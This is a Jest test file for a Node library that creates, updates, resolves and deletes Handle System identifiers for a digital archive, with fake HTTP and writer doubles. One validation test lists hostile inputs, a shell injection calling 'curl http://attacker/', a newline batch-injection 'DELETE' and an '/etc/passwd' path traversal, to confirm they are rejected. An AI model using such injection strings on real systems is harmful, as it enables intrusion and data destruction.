'use strict';

/*
 * libs/handles replaced the retired Python handles-service. Transport is
 * split: reads resolve over HTTP from Node, writes go through the
 * DuHandleTool Java helper on the native protocol (the handle server
 * offers no auth over HTTP). These fake both boundaries — `http` for
 * resolution, `writer` for the helper — so the branching logic, the uuid
 * guard and the per-handle URL-index discovery are all exercised without
 * a JVM or a network.
 */

const handles_module = require('../../../libs/handles');
const app_config = require('../../../config/app');
const { UpstreamError } = require('../../../libs/errors');

const UUID = '2d569507-de89-41eb-9bb6-6be0d12b5eb8';
const HANDLE_URL = `https://hdl.example.com/20.500.12345/${UUID}`;

function make_fake_http() {
    const calls = { get: [] };
    let queue = [];
    let next = { status: 200, data: { responseCode: 1, values: [] } };

    function take() {
        const r = queue.length ? queue.shift() : next;
        if (r.throw) throw r.throw;
        return r;
    }

    return {
        calls,
        set_response(r) { next = r; queue = []; },
        set_responses(list) { queue = [...list]; },
        async get(url, opts) { calls.get.push({ url, opts }); return take(); },
    };
}

function make_fake_writer() {
    const calls = [];
    let next = { status: 200, data: { responseCode: 1 } };
    return {
        calls,
        set_result(r) { next = r; },
        async write(op, uuid, opts) {
            calls.push({ op, uuid, opts });
            if (next.throw) throw next.throw;
            return next;
        },
    };
}

function client_with(http, writer = make_fake_writer()) {
    return handles_module.create_client(http, writer);
}

function resolved(values) {
    return { status: 200, data: { responseCode: 1, values } };
}

/*
 * The corpus is not uniform. Handles minted by the retired Python service
 * hold the URL at index 2 with no HS_ADMIN; 2019-era handles hold it at
 * index 1 alongside an HS_ADMIN at 100. Writing to a fixed index 2 would
 * add a second, conflicting URL value to the latter.
 */
const URL_AT_2 = [
    { index: 2, type: 'URL', data: { format: 'string', value: 'https://old/x' } },
];
const URL_AT_1_WITH_ADMIN = [
    { index: 100, type: 'HS_ADMIN', data: { format: 'admin', value: {} } },
    { index: 1, type: 'URL', data: { format: 'string', value: 'https://old/x' } },
];

describe('libs/handles', () => {
    let original_env;
    beforeEach(() => {
        original_env = { ...process.env };
        process.env.HANDLE_ADMIN_URL = 'http://handle.example.edu:8000';
        process.env.HANDLE_ADMIN_ID = '300:0.NA/20.500.12345';
        process.env.HANDLE_ADMIN_KEY_PATH = '/etc/repov2/admpriv.bin';
        process.env.HANDLE_ADMIN_PASSPHRASE = 'secret';
        process.env.HANDLE_CLIENT_LIB = '/opt/handle-client/lib';
        delete process.env.HANDLE_HELPER_CLASSPATH;
        process.env.HANDLE_JAVA_BIN = 'java';
        process.env.HANDLE_TARGET = 'https://example.edu/object/';
        process.env.HANDLE_PREFIX = '20.500.12345';
        process.env.HANDLE_SERVER = 'https://hdl.example.com/';
        process.env.HANDLE_TTL = '86400';
        process.env.HANDLE_TIMEOUT_MS = '5000';
        app_config._reset();
    });
    afterEach(() => {
        process.env = original_env;
        app_config._reset();
    });

    describe('is_configured', () => {
        it('returns true when read and write credentials are both present', () => {
            expect(handles_module.is_configured()).toBe(true);
        });

        it.each([
            'HANDLE_ADMIN_URL',
            'HANDLE_ADMIN_ID',
            'HANDLE_ADMIN_KEY_PATH',
            'HANDLE_CLIENT_LIB',
            'HANDLE_TARGET',
            'HANDLE_PREFIX',
            'HANDLE_SERVER',
        ])('returns false when %s is missing', (name) => {
            delete process.env[name];
            app_config._reset();
            expect(handles_module.is_configured()).toBe(false);
        });

        it('does not require a passphrase (an unencrypted key is valid)', () => {
            delete process.env.HANDLE_ADMIN_PASSPHRASE;
            app_config._reset();
            expect(handles_module.is_configured()).toBe(true);
        });
    });

    /*
     * A test ingest run against production would otherwise mint a real,
     * permanent identifier under the live prefix. Removing one afterwards is
     * hard on purpose (see scripts/delete_object_handles.js), so not minting
     * is the only cheap fix.
     */
    describe('is_skipped_batch', () => {
        beforeEach(() => {
            process.env.HANDLE_SKIP_BATCH_TOKENS = 'test,tmp';
            app_config._reset();
        });

        /*
         * DU's convention puts the marker mid-name, so this must match on
         * whole tokens rather than a prefix. The first case is the real
         * production test folder.
         */
        it.each([
            'U358_LDT_TEST_Collection-resources_1204',
            'U358_LDT_test_Collection-resources_1204',
            'test-2026-07-31',
            'Denver-Collection-TEST',
            'a.test.folder',
            'some tmp batch',
            '  U358_TEST_padded  ',
        ])('skips %s', (batch) => {
            expect(handles_module.is_skipped_batch(batch)).toBe(true);
        });

        /*
         * The substring trap. A naive `includes('test')` would silently
         * withhold handles from every one of these real collection names.
         */
        it.each([
            'testament-papers',
            'Latest-Acquisitions',
            'attestation_records',
            'greatest_hits',
            'U358_LDT_Collection-resources_1204',
            'contest-entries',
        ])('does not skip %s', (batch) => {
            expect(handles_module.is_skipped_batch(batch)).toBe(false);
        });

        /*
         * Absence of a name is not evidence of a test. Silently withholding a
         * handle from a real ingest is the worse error.
         */
        it.each([['PENDING', 'PENDING'], ['empty', ''], ['whitespace', '   '],
            ['null', null], ['undefined', undefined], ['a number', 42]])
            ('does not skip %s', (_label, batch) => {
                expect(handles_module.is_skipped_batch(batch)).toBe(false);
            });

        /*
         * The marker is on the collection folder only. Package folder names
         * become ArchivesSpace component ids during Make Digital Objects, so
         * they cannot carry one — nothing here should ever read them.
         */
        it('is not applied to package names by the caller', () => {
            /* documents intent: the stage passes row.batch, never row.package */
            expect(handles_module.is_skipped_batch('test_B005.06.0185.0014.00001'))
                .toBe(true);
        });

        /*
         * config's optional() treats '' as unset, so blanking the variable
         * restores the default rather than disabling the skip. That is the
         * safe direction — the failure mode of accidentally disabling it is a
         * permanent identifier — but it is surprising, so pin it.
         */
        it('falls back to the default when blanked, rather than disabling', () => {
            process.env.HANDLE_SKIP_BATCH_TOKENS = '';
            app_config._reset();
            expect(handles_module.is_skipped_batch('U358_LDT_TEST_x')).toBe(true);
        });

        /* To genuinely disable it, set a token nothing will match. */
        it('can be disabled with a non-matching token', () => {
            process.env.HANDLE_SKIP_BATCH_TOKENS = '__never__';
            app_config._reset();
            expect(handles_module.is_skipped_batch('U358_LDT_TEST_x')).toBe(false);
        });

        it('defaults to "test" when unset', () => {
            delete process.env.HANDLE_SKIP_BATCH_TOKENS;
            app_config._reset();
            expect(handles_module.is_skipped_batch('U358_LDT_TEST_Collection-resources_1204'))
                .toBe(true);
            expect(handles_module.is_skipped_batch('U358_LDT_Collection-resources_1204'))
                .toBe(false);
        });
    });

    describe('build_handle_url', () => {
        it('joins server + prefix + uuid with a single slash between each', () => {
            expect(handles_module.build_handle_url(UUID)).toBe(HANDLE_URL);
        });

        it('tolerates a server without trailing slash', () => {
            process.env.HANDLE_SERVER = 'https://hdl.example.com';
            app_config._reset();
            expect(handles_module.build_handle_url(UUID)).toBe(HANDLE_URL);
        });

        it('strips leading/trailing slashes from the prefix', () => {
            process.env.HANDLE_PREFIX = '/20.500.12345/';
            app_config._reset();
            expect(handles_module.build_handle_url(UUID)).toBe(HANDLE_URL);
        });

        it('is independent of HANDLE_TARGET, so a target migration needs no DB change', () => {
            process.env.HANDLE_TARGET = 'https://somewhere-else.edu/object/';
            app_config._reset();
            expect(handles_module.build_handle_url(UUID)).toBe(HANDLE_URL);
        });
    });

    /*
     * The retired service interpolated uuid into a shell string and a
     * handle batch file. Nothing here reaches a shell, but malformed
     * identifiers still must not enter the handle namespace — 10176/0 and
     * 10176/du-test-handle04 exist in production because nothing checked.
     */
    describe('identifier validation', () => {
        it.each([
            ['a legacy non-uuid name', 'uuid-1'],
            ['a shell metacharacter', 'x;curl http://attacker/'],
            ['an embedded newline (batch injection)', 'x\nDELETE 20.500.12345/other'],
            ['a path traversal', '../../../etc/passwd'],
            ['an empty string', ''],
            ['a non-string', 42],
        ])('rejects %s without invoking the writer', async (_label, bad) => {
            const http = make_fake_http();
            const writer = make_fake_writer();
            const client = handles_module.create_client(http, writer);
            await expect(client.create_handle(bad)).rejects.toBeInstanceOf(UpstreamError);
            expect(writer.calls).toHaveLength(0);
        });
    });

    describe('create_handle', () => {
        it('asks the writer to create at index 2 with the configured target', async () => {
            const http = make_fake_http();
            const writer = make_fake_writer();
            const res = await handles_module.create_client(http, writer).create_handle(UUID);

            expect(res).toEqual({ status: 201, handle: HANDLE_URL });
            expect(writer.calls).toHaveLength(1);
            expect(writer.calls[0]).toEqual({
                op: 'create',
                uuid: UUID,
                opts: { index: 2, url: `https://example.edu/object/${UUID}` },
            });
        });

        /*
         * The handle exists and points where it should, so the ingest should
         * proceed. Failing an otherwise-good ingest because a previous run
         * already minted the handle would be wrong.
         */
        it('treats "already exists" as success and returns the handle URL', async () => {
            const http = make_fake_http();
            const writer = make_fake_writer();
            writer.set_result({ status: 409, data: { responseCode: 101 } });
            const res = await handles_module.create_client(http, writer).create_handle(UUID);
            expect(res).toEqual({ status: 201, handle: HANDLE_URL });
        });

        it('returns { handle: null } on an unexpected response code', async () => {
            const http = make_fake_http();
            const writer = make_fake_writer();
            writer.set_result({ status: 502, data: { responseCode: 402 } });
            const res = await handles_module.create_client(http, writer).create_handle(UUID);
            expect(res).toEqual({ status: 502, handle: null });
        });

        it('throws UpstreamError when the helper cannot run', async () => {
            const http = make_fake_http();
            const writer = make_fake_writer();
            writer.set_result({ throw: new UpstreamError('Cannot run handle helper') });
            await expect(handles_module.create_client(http, writer).create_handle(UUID))
                .rejects.toBeInstanceOf(UpstreamError);
        });
    });

    describe('update_handle', () => {
        it('updates index 2 for a service-minted handle', async () => {
            const http = make_fake_http();
            const writer = make_fake_writer();
            http.set_response(resolved(URL_AT_2));
            const res = await handles_module.create_client(http, writer).update_handle(UUID);

            expect(res).toEqual({ status: 201, handle: HANDLE_URL });
            expect(writer.calls[0].op).toBe('modify');
            expect(writer.calls[0].opts.index).toBe(2);
        });

        it('updates index 1 for a 2019-era handle rather than adding a second URL', async () => {
            const http = make_fake_http();
            const writer = make_fake_writer();
            http.set_response(resolved(URL_AT_1_WITH_ADMIN));
            const res = await handles_module.create_client(http, writer).update_handle(UUID);

            expect(res).toEqual({ status: 201, handle: HANDLE_URL });
            expect(writer.calls[0].opts.index).toBe(1);
        });

        it('adds a URL at the default index when the handle has none', async () => {
            const http = make_fake_http();
            const writer = make_fake_writer();
            http.set_response(resolved([{ index: 100, type: 'HS_ADMIN', data: {} }]));
            await handles_module.create_client(http, writer).update_handle(UUID);
            expect(writer.calls[0].opts.index).toBe(2);
        });

        it('does not attempt a write when the handle does not exist', async () => {
            const http = make_fake_http();
            const writer = make_fake_writer();
            http.set_response({ status: 404, data: { responseCode: 100 } });
            const res = await handles_module.create_client(http, writer).update_handle(UUID);

            expect(res).toEqual({ status: 404, handle: null });
            expect(writer.calls).toHaveLength(0);
        });

        it('re-points at the current HANDLE_TARGET', async () => {
            process.env.HANDLE_TARGET = 'https://digitalarchives.example.edu/object/';
            app_config._reset();
            const http = make_fake_http();
            const writer = make_fake_writer();
            http.set_response(resolved(URL_AT_2));
            await handles_module.create_client(http, writer).update_handle(UUID);

            expect(writer.calls[0].opts.url)
                .toBe(`https://digitalarchives.example.edu/object/${UUID}`);
        });

        it('returns { handle: null } on an unexpected write result', async () => {
            const http = make_fake_http();
            const writer = make_fake_writer();
            http.set_response(resolved(URL_AT_2));
            writer.set_result({ status: 502, data: { responseCode: 2 } });
            const res = await handles_module.create_client(http, writer).update_handle(UUID);
            expect(res.handle).toBeNull();
        });
    });

    describe('get_handle', () => {
        it('resolves over HTTP without invoking the writer', async () => {
            const http = make_fake_http();
            const writer = make_fake_writer();
            http.set_response(resolved([]));
            const out = await handles_module.create_client(http, writer).get_handle(UUID);

            expect(out).toEqual({ responseCode: 1, values: [] });
            expect(writer.calls).toHaveLength(0);
            expect(http.calls.get[0].url).toBe(
                `http://handle.example.edu:8000/api/handles/20.500.12345/${UUID}`
            );
        });

        it('returns null for a handle that does not exist', async () => {
            const http = make_fake_http();
            http.set_response({ status: 404, data: { responseCode: 100 } });
            expect(await client_with(http).get_handle(UUID)).toBeNull();
        });

        it('throws on an unexpected status rather than reporting absence', async () => {
            const http = make_fake_http();
            http.set_response({ status: 503, data: '' });
            await expect(client_with(http).get_handle(UUID))
                .rejects.toBeInstanceOf(UpstreamError);
        });
    });

    describe('url_value_index', () => {
        it('reports the index actually holding the URL', async () => {
            const http = make_fake_http();
            http.set_response(resolved(URL_AT_1_WITH_ADMIN));
            expect(await client_with(http).url_value_index(UUID)).toBe(1);
        });

        it('returns null for a handle that does not exist', async () => {
            const http = make_fake_http();
            http.set_response({ status: 404, data: { responseCode: 100 } });
            expect(await client_with(http).url_value_index(UUID)).toBeNull();
        });
    });

    describe('delete_handle', () => {
        it('reports deletion on success', async () => {
            const http = make_fake_http();
            const writer = make_fake_writer();
            const out = await handles_module.create_client(http, writer).delete_handle(UUID);
            expect(out).toEqual({ status: 200, deleted: true });
            expect(writer.calls[0].op).toBe('delete');
        });

        it('reports not-found rather than throwing', async () => {
            const http = make_fake_http();
            const writer = make_fake_writer();
            writer.set_result({ status: 404, data: { responseCode: 100 } });
            const out = await handles_module.create_client(http, writer).delete_handle(UUID);
            expect(out).toEqual({ status: 404, deleted: false });
        });
    });
});
